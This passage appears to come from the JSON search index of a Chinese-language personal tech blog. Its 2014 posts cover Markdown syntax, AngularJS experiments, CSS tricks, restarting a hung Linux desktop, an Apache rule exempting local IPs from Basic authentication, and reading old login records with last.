\\[谷歌]\\[谷歌].(id:中文也可以，不區分大小寫)</span><br><span class=\"line\">\\[Google]: http://google.com.tw  &quot;Google&quot;</span><br><span class=\"line\">\\[谷歌]: http://google.com.tw  &quot;谷歌&quot;</span><br></pre></td></tr></table></figure>\n<p>連結Google可以省略寫成<br>[Google][]<br>[Google]:<a href=\"http://google.com.tw\" target=\"_blank\" rel=\"noopener\">http://google.com.tw</a><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">\\[Google][]</span><br><span class=\"line\">\\[Google]:http://google.com.tw</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">*em*</span><br><span class=\"line\">__strong__</span><br></pre></td></tr></table></figure>\n<p><code>ls -l</code>(一行顯示)<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">`ls -l`</span><br></pre></td></tr></table></figure></p>\n<p>This is a <img src=\"https://www.google.com.tw/images/icons/product/chrome-48.png\" alt=\"Chrome Image\">(用法跟一般連結差不多)<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">This is a ![Chrome Image](https://www.google.com.tw/images/icons/product/chrome-48.png)</span><br></pre></td></tr></table></figure></p>\n<p>單一*或_包圍字串會轉成\\<em><br>兩個*或_包圍字串\\<strong><br><em>em</em><br><strong>strong</strong><br><del>strike</del></strong></em></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">*em*</span><br><span class=\"line\">__strong__</span><br><span class=\"line\">~~strike~~</span><br></pre></td></tr></table></figure>\n<blockquote><p>Flying is learning how to throw yourself at the ground and miss.</p>\n<footer><strong>Author Name</strong></footer></blockquote>\n<blockquote><p>Over the past 24 hours I’ve been reflecting on my life &amp; I’ve realized only one thing. I need a medieval battle axe.</p>\n<footer><strong>Author Name</strong><cite><a href=\"https://example.com/quotation/source/link\" target=\"_blank\" rel=\"noopener\">example.com/quotation/source/link</a></cite></footer></blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;% blockquote Author Name %&#125;</span><br><span class=\"line\">Flying is learning how to throw yourself at the ground and miss.</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> \\&#123;% blockquote Author Name https://example.com/quotation/source/link %&#125;</span><br><span class=\"line\">Over the past 24 hours I&apos;ve been reflecting on my life &amp; I&apos;ve realized only one thing. I need a medieval battle axe.</span><br><span class=\"line\">&#123;% endblockquote %&#125;</span><br></pre></td></tr></table></figure>\n<table>\n<thead>\n<tr>\n<th></th>\n<th style=\"text-align:center\">第一欄</th>\n<th style=\"text-align:center\">第二欄</th>\n<th>第三欄</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td></td>\n<td style=\"text-align:center\">第一格</td>\n<td style=\"text-align:center\">第二格</td>\n<td>第三格</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td style=\"text-align:center\">第一格</td>\n<td style=\"text-align:center\">第二格</td>\n<td>第三格</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">|第一欄|第二欄|第三欄|</span><br><span class=\"line\">-------|:-------:|:--------:|</span><br><span class=\"line\">|第一格|第二格|第三格|</span><br><span class=\"line\">|第一格|第二格|第三格|</span><br></pre></td></tr></table></figure>\n<p><strong><em>test</em></strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1+1=2</span><br></pre></td></tr></table></figure>\n<p>有些用Markdown包起`<code></code>來好像怪怪的，不知道是不是我寫錯的關係。以前也不知道Markdown也能寫表格XD<br>希望以後這些我前用的到。</p>\n","categories":["Markdown"],"tags":["Markdown"]},{"title":"webix-強大WEB UI Framework","url":"/blog/2014/05/28/logdown/2014-05-28-webix-powerful-web-ui-framework/","content":"<p>#webix</p>\n<blockquote>\n<p>這個白俄羅斯人寫的 UI Framework 有點強大呀！整合了 Backbone.js 與 AngularJS ，光看首頁的 Demo (不是圖片動畫喔) 就讓人好熱血！</p>\n</blockquote>\n<p><a href=\"http://webix.com/\" target=\"_blank\" rel=\"noopener\">http://webix.com/</a></p>\n<p>在Jace Ju的FB看到不錯好工具，先記錄一下，有空去實作看看。^^</p>\n","categories":["Web-UI"],"tags":["Web-UI","webix"]},{"title":"AngularJS新手小試","url":"/blog/2014/06/14/logdown/2014-06-14-angularjs-novice-trial/","content":"<p>AngularJS是一個MVC架構JavaScript Framework，是這幾年比較紅的。<a href=\"http://zh.wikipedia.org/wiki/AngularJS\" target=\"_blank\" rel=\"noopener\">詳細介紹維基</a></p>\n<p>最近簡單做了簡單輸入檔案計算，如下<br><a id=\"more\"></a></p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"zh-TW\"</span> <span class=\"attr\">ng-app</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0-beta.11/angular.min.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>簡易檔案計算程式  WEB<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">select_all</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t <span class=\"keyword\">var</span> textBox = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"foo\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">\ttextBox.focus();</span></span><br><span class=\"line\"><span class=\"undefined\">\ttextBox.select();</span></span><br><span class=\"line\"><span class=\"undefined\">\t&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">\tshowFileData =<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">$scope</span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t$scope.test = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t<span class=\"keyword\">if</span> ($scope.isShowGB) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t<span class=\"keyword\">if</span> ($scope.fileGBMB==<span class=\"string\">\"GB\"</span>) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t\t$scope.fileData = $scope.fileNumber+<span class=\"string\">\"GB\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t\t$scope.fileData = <span class=\"built_in\">Number</span>($scope.fileNumber/<span class=\"number\">1024</span>).toFixed(<span class=\"number\">1</span>)+<span class=\"string\">\"GB\"</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t<span class=\"keyword\">if</span> ($scope.fileGBMB==<span class=\"string\">\"GB\"</span>) &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t\t$scope.fileData = <span class=\"built_in\">Number</span>($scope.fileNumber*<span class=\"number\">1024</span>).toFixed(<span class=\"number\">0</span>)+<span class=\"string\">\"MB\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t\t\t\t\t$scope.fileData = $scope.fileNumber+<span class=\"string\">\"MB\"</span>;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\">\t\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">\t&#125;</span></span><br><span class=\"line\"><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"undefined\">\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">style</span>=<span class=\"string\">\"margin: 10px auto; width:90%;line-height:36px;background-color:#e6e6e6\"</span> <span class=\"attr\">ng-controller</span>=<span class=\"string\">\"showFileData\"</span> <span class=\"attr\">ng-form</span>=<span class=\"string\">\"form1\"</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"checkbox\"</span> <span class=\"attr\">ng-model</span>=<span class=\"string\">\"isShowGB\"</span>  <span class=\"attr\">ng-change</span>=<span class=\"string\">\"test()\"</span>  /&gt;</span>顯示GB<span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span></span><br><span class=\"line\">\t檔案大小：<span class=\"tag\">&lt;<span class=\"name\">input</span>  <span class=\"attr\">type</span>=<span class=\"string\">\"number\"</span> <span class=\"attr\">ng-model</span>=<span class=\"string\">\"fileNumber\"</span>  <span class=\"attr\">ng-change</span>=<span class=\"string\">\"test()\"</span> <span class=\"attr\">required</span> /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">select</span> <span class=\"attr\">ng-model</span>=<span class=\"string\">\"fileGBMB\"</span> <span class=\"attr\">ng-init</span>=<span class=\"string\">\"fileGBMB='GB'\"</span> <span class=\"attr\">ng-change</span>=<span class=\"string\">\"test()\"</span> <span class=\"attr\">required</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"GB\"</span>&gt;</span>GB<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">option</span> <span class=\"attr\">value</span>=<span class=\"string\">\"MB\"</span>&gt;</span>MB<span class=\"tag\">&lt;/<span class=\"name\">option</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">select</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">ng-hide</span>=<span class=\"string\">\"form1.$invalid\"</span>&gt;</span>&#123;&#123;fileData&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">ng-show</span>=<span class=\"string\">\"form1.$invalid\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>必要欄位沒填!!!<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>本實驗只有用到</p>\n<ul>\n<li>ng-model</li>\n<li>ng-controller</li>\n<li>ng-click</li>\n<li>ng-init</li>\n<li>ng-change</li>\n<li>ng-form</li>\n<li>ng-show / ng-hide</li>\n</ul>\n<p>這次表單驗證是利用AngularJS內鍵功能來實作，<code>form1.$invalid</code>會傳會現在欄位是否真入正確值，還會查看HTML<code>type</code>是否符合型態，ng-show</p>\n<p>透過這次簡單的實驗發現AngularJS是一個很實用的工具，不知道是不是JQuery Selector用習慣的係，有時候控制裡面的原件都不知道如何去控制ng-show/ng-hide來顯示出結果要呈現。</p>\n<p>Google搜尋到不錯30天學AngularJS教學<br><a href=\"http://ithelp.ithome.com.tw/question/10132196\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/question/10132196</a></p>\n","categories":["AngularJS"],"tags":["AngularJS"]},{"title":"不同桌面解析度用CSS調整圖適中的方法(max-width)","url":"/blog/2014/06/14/logdown/2014-06-14-moderate-css-adjustments-for-different-desktop-resolutions-methods-max-width/","content":"<p>今天用平板電腦看<a href=\"http://www.glayer.net/\" target=\"_blank\" rel=\"noopener\">Glayer</a><br>發現橫向、直向看某圖大小非常不一樣。<br>起先我以為是我的錯覺，在經過用Firefox確實大小不一樣。<br><a id=\"more\"></a></p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/206142/1EsrMUkrSI2yQ0fuBjQo_%E7%95%AB%E9%9D%A2%E6%93%B7%E5%8F%96%E6%96%BC%202014-06-01%2019.30.51.png\" alt=\"畫面擷取於 2014-06-01 19.30.51.png\"></p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/206142/wLWdhaoPQMCFxmDZHsgU_%E7%95%AB%E9%9D%A2%E6%93%B7%E5%8F%96%E6%96%BC%202014-06-01%2019.31.24.png\" alt=\"畫面擷取於 2014-06-01 19.31.24.png\"></p>\n<p>本來在想是用什麼巫術才能變成這樣，Bootstrap?HTML?<br>沒想到是CSS的<code>max-width</code>的關係</p>\n<p>之前看到CSS的<code>max-width</code>一直都不知道要試用於哪裡<br>今天總算知道了:D</p>\n","categories":["CSS"],"tags":["max-width,CSS"]},{"title":"重啟Linux桌面方法","url":"/blog/2014/06/11/logdown/2014-06-11-reboot-the-linux-desktop/","content":"<p>最近使用Ezgo  11有時都會當機不動…<br>最後都跳到tty1直接<code>sudo reboot</code></p>\n<p>後來在想有沒有重啟桌面不重新開機方法…<br>在經過一直Google下最終找到了方法 :D</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ps aux |grep tty 7</span><br><span class=\"line\">sudo kill &#123;tty7 id&#125;</span><br></pre></td></tr></table></figure>\n<p>原來就<strong>殺掉tty</strong>就會自動重啟!!!!</p>\n","categories":["Linux"],"tags":["Linux,tty,"]},{"title":"Apache設定區域IP免BASIC認證就直接進入網頁","url":"/blog/2014/06/21/logdown/2014-06-21-set-regional-ip-from-apache-basic-authentication-directly-into-the-webpage/","content":"<p>最近厭煩在家還要輸入Basic認證才能線上聽到我的Raspberry Pi上音樂<br>看了大多數htaccess設定  都沒辦法達成我想要的結果</p>\n<p>最後在<a href=\"http://stackoverflow.com/questions/3649852/allow-ip-address-without-authentication\" target=\"_blank\" rel=\"noopener\">.htaccess - Allow IP address without authentication - Stack Overflow</a>這篇找到正解<br><a id=\"more\"></a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Order deny,allow</span><br><span class=\"line\">Deny from all</span><br><span class=\"line\">AuthName &quot;Please type password&quot;</span><br><span class=\"line\">AuthType Basic</span><br><span class=\"line\">AuthUserFile &quot;/var/www/player/.htpasswd&quot;</span><br><span class=\"line\">require valid-user</span><br><span class=\"line\">Allow from 192.168.0.0/24</span><br><span class=\"line\">Satisfy Any</span><br></pre></td></tr></table></figure>\n<p>以後在家就不用打認證:D</p>\n<h1 id=\"htaccess相關設定文件\"><a href=\"#htaccess相關設定文件\" class=\"headerlink\" title=\"htaccess相關設定文件\"></a>htaccess相關設定文件</h1><p><a href=\"http://www.htaccesseditor.com/tc.shtml\" target=\"_blank\" rel=\"noopener\">在線上製作.htaccess</a><br><a href=\"http://www.fwolf.com/blog/post/341\" target=\"_blank\" rel=\"noopener\">Apache的Satisfy详解</a><br><a href=\"http://www.php100.com/html/webkaifa/apache/2012/1031/11436.html\" target=\"_blank\" rel=\"noopener\">常見的 .htaccess 使用技巧</a></p>\n","categories":["Apache"],"tags":["Http Auth","Apache",".htaccess"]},{"title":"瀏覽器播放影片控制開始時間和結束時間","url":"/blog/2014/06/25/logdown/2014-06-25-play-the-movie-browser-controls-the-start-time-and-end-time/","content":"<p>最近在想有沒有瀏覽器播放MP4控制播放時間<br>結果一搜尋還真的有耶!!!</p>\n<p>在(Start HTML5 video at a particular position when loading?)[<a href=\"http://stackoverflow.com/questions/5981427/start-html5-video-at-a-particular-position-when-loading]這篇找到相關方法\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/5981427/start-html5-video-at-a-particular-position-when-loading]這篇找到相關方法</a><br><a id=\"more\"></a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.yoursite.com/yourfolder/yourfile.mp4#t=5,15</span><br></pre></td></tr></table></figure>\n<p>後來還發現能用00:00:00格式<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://www.yoursite.com/yourfolder/yourfile.mp4#t=0:00:00,0:01:00</span><br></pre></td></tr></table></figure></p>\n<p>(Media Fragment)[<a href=\"http://www.w3.org/TR/media-frags/]\" target=\"_blank\" rel=\"noopener\">http://www.w3.org/TR/media-frags/]</a></p>\n","categories":["HTML"],"tags":["mp4","video"]},{"title":"Bootstrap相關不錯的工具網站","url":"/blog/2014/06/26/logdown/2014-06-26-bootstrap-good-tools-website/","content":"<p><a href=\"http://www.webmart.tw/blog/15-best-bootstrap-tools-for-designers/\" target=\"_blank\" rel=\"noopener\">http://www.webmart.tw/blog/15-best-bootstrap-tools-for-designers/</a></p>\n<p><a href=\"http://bootswatch.com/\" target=\"_blank\" rel=\"noopener\">http://bootswatch.com/</a></p>\n","categories":["網站記錄"]},{"title":"AngularJS讀取載入檔案資訊","url":"/blog/2014/07/03/logdown/2014-07-03-read-angularjs-loading-file-information/","content":"<p><a href=\"http://www.dotblogs.com.tw/regionbbs/archive/2012/06/28/html5.file.api.aspx\" target=\"_blank\" rel=\"noopener\">http://www.dotblogs.com.tw/regionbbs/archive/2012/06/28/html5.file.api.aspx</a><br><a href=\"http://odetocode.com/blogs/scott/archive/2013/07/05/a-file-input-directive-for-angularjs.aspx\" target=\"_blank\" rel=\"noopener\">http://odetocode.com/blogs/scott/archive/2013/07/05/a-file-input-directive-for-angularjs.aspx</a><br><a href=\"http://stackoverflow.com/questions/16579427/html5-file-upload-with-angularjs\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/16579427/html5-file-upload-with-angularjs</a><br><a href=\"http://plnkr.co/edit/JPxSCyrxosVXfZnzEIuS?p=preview\" target=\"_blank\" rel=\"noopener\">http://plnkr.co/edit/JPxSCyrxosVXfZnzEIuS?p=preview</a><br><a href=\"http://plnkr.co/edit/HEA7wYq8Uv0Ee0J4SX7u?p=preview\" target=\"_blank\" rel=\"noopener\">http://plnkr.co/edit/HEA7wYq8Uv0Ee0J4SX7u?p=preview</a></p>\n<p>html<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">ng-app</span>=<span class=\"string\">\"plunker\"</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>AngularJS Plunker<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"javascript\"><span class=\"built_in\">document</span>.write(<span class=\"string\">'&lt;base href=\"'</span> + <span class=\"built_in\">document</span>.location + <span class=\"string\">'\" /&gt;'</span>);</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"style.css\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"https://ajax.googleapis.com/ajax/libs/angularjs/1.0.6/angular.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"app.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">ng-controller</span>=<span class=\"string\">\"MainCtrl\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">\"file\"</span> <span class=\"attr\">filelist-bind</span> <span class=\"attr\">multiple</span>=<span class=\"string\">\"multiple\"</span>  <span class=\"attr\">name</span>=<span class=\"string\">\"files\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">files : <span class=\"tag\">&lt;<span class=\"name\">pre</span>&gt;</span>&#123;&#123; files | json &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">pre</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> app = angular.module(<span class=\"string\">'plunker'</span>, []);</span><br><span class=\"line\"></span><br><span class=\"line\">app.directive(<span class=\"string\">'filelistBind'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> scope, elm, attrs </span>) </span>&#123;</span><br><span class=\"line\">    elm.bind(<span class=\"string\">'change'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> evt </span>) </span>&#123;</span><br><span class=\"line\">      scope.$apply(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        name =<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;evt.target.files.length;i++)&#123;</span><br><span class=\"line\">          alert(evt.target.files[i].name);</span><br><span class=\"line\">          name += evt.target.files[i].name;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        scope[ attrs.name ] = name;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.controller(<span class=\"string\">'MainCtrl'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">$scope</span>) </span>&#123;</span><br><span class=\"line\">  $scope.name = <span class=\"string\">'World'</span>;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://stackoverflow.com/questions/16207202/required-attribute-not-working-with-file-input-in-angular-js\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/16207202/required-attribute-not-working-with-file-input-in-angular-js</a><br><a href=\"http://jsfiddle.net/danielzen/utp7j/\" target=\"_blank\" rel=\"noopener\">http://jsfiddle.net/danielzen/utp7j/</a></p>\n","categories":["AngularJS"]},{"title":"last登入資訊不見了!!!","url":"/blog/2014/07/01/logdown/2014-07-01-last-login-information-is-gone/","content":"<p>今天在宿舍連家裡的動物機連不進去，後來就用真實IP連線去了<br>登入後馬上下意識用<code>last</code>去看一下登入狀況<br>結果發現只有一條剛剛登入的訊息!!!<br><a id=\"more\"></a></p>\n<p>後來看了一下鳥哥<a href=\"http://linux.vbird.org/linux_basic/0570syslog/0570syslog-fc4.php#analyze_command\" target=\"_blank\" rel=\"noopener\">一些常見指令： last, lastlog, dmesg</a><br><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@linux ~]<span class=\"comment\"># last -n number</span></span><br><span class=\"line\">[root@linux ~]<span class=\"comment\"># last -f filename</span></span><br><span class=\"line\">參數：</span><br><span class=\"line\">-n  ：我們知道 last 會讀出這個月的資料，若資料量太大，可使用 -n 來嚴格要求</span><br><span class=\"line\">      所以顯示的筆數即可。例如 20 筆資料： last -n 20 或 last -20 均可。</span><br><span class=\"line\">-f  ：last 預設讀出 /var/<span class=\"built_in\">log</span>/wtmp 這個檔案，但是我們可以透過 -f 讀取不同的</span><br><span class=\"line\">      登錄檔資訊喔！</span><br><span class=\"line\">範例：</span><br><span class=\"line\"></span><br><span class=\"line\">範例一：將上個月的資料讀出，僅讀出 5 筆資料時？</span><br><span class=\"line\">[root@linux ~]<span class=\"comment\"># last -n 5 -f /var/log/wtmp.1</span></span><br><span class=\"line\">dmtsai2  pts/2             Mon Oct 24 14:18 - 14:18  (00:00)</span><br><span class=\"line\">dmtsai2  work:0 work       Mon Oct 24 14:18    gone - no <span class=\"built_in\">logout</span></span><br><span class=\"line\">dmtsai2  work:0 work       Mon Oct 24 14:18 - 14:18  (00:00)</span><br><span class=\"line\">dmtsai2  pts/2             Mon Oct 24 14:18 - 14:18  (00:00)</span><br><span class=\"line\">dmtsai2  work:0 work       Mon Oct 24 14:18 - 14:18  (00:00)</span><br></pre></td></tr></table></figure></p>\n<p>舊的登入資訊會存到wtmp.1那邊</p>\n<p>致於no-ip不能連的原因是似乎no-ip那邊出點狀況。<a href=\"http://kfei.logdown.com/posts/207916-poor-no-ip\" target=\"_blank\" rel=\"noopener\">詳細原因</a></p>\n<blockquote>\n<p> NOTICE: Our domains are still experiencing outages due to the Microsoft takedown. Please read our formal statement on the matter.</p>\n</blockquote>\n<p>看來動物機沒被hack :)<br>白擔心了一下</p>\n<p>今日發現<code>lastlog</code>實用的指令，查詢所有帳號最後一次登入的時間<br>可惜這個指令目前用不太到</p>\n","categories":["Linux"],"tags":["Linux","last"]},{"title":"說話框放大縮小特效、背景置中","url":"/blog/2014/07/06/logdown/2014-07-06-talk-box-zoom-effects/","content":"<p>前幾天逛到<a href=\"http://ansatsu-anime.com/main.php\" target=\"_blank\" rel=\"noopener\">暗殺教室動畫官網</a><br><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/208517/qEtVYRBzTvCwqT5HmhGf_%E6%9A%97%E6%AE%BA1.png\" alt=\"暗殺1.png\"><br>指要把滑鼠移到暗殺老師頭，旁邊就會跑出說話框<br><a id=\"more\"></a></p>\n<p><img src=\"http://user-image.logdown.io/user/8284/blog/8171/post/208517/vh7wWd6TMeWPpxRbg0I4_%E6%9A%97%E6%AE%BA2.png\" alt=\"暗殺2.png\"><br>然而還可以貼其靠左置中</p>\n<p>而且持續拉螢幕一直放大，中間圖片背景還是不變(置中)<br>正常div置中都是用<br><figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">width</span><span class=\"selector-pseudo\">:50</span>%;</span><br><span class=\"line\"><span class=\"selector-tag\">margin</span><span class=\"selector-pseudo\">:0px</span> <span class=\"selector-tag\">auto</span>;</span><br></pre></td></tr></table></figure></p>\n<p>不過<br>完完全全不知道是怎麼做到了<br>想了很久其實很簡單<br><figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">background-repeat</span>: <span class=\"selector-tag\">no-repeat</span>;</span><br><span class=\"line\"><span class=\"selector-tag\">background-position</span>: <span class=\"selector-tag\">center</span> <span class=\"selector-tag\">top</span>;</span><br></pre></td></tr></table></figure></p>\n<p>當出碰CSS沒有印象有<code>background-position</code>這個東西</p>\n<p>接下來，說話框他貼齊的方法是用table<br><figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.fukidashi</span> <span class=\"selector-tag\">table</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">height</span>: <span class=\"number\">305px</span>;</span><br><span class=\"line\">\t<span class=\"attribute\">width</span>: <span class=\"number\">225px</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.fukidashi</span> <span class=\"selector-tag\">td</span> &#123;</span><br><span class=\"line\">\t<span class=\"attribute\">text-align</span>: left;</span><br><span class=\"line\">\t<span class=\"attribute\">vertical-align</span>: middle;</span><br><span 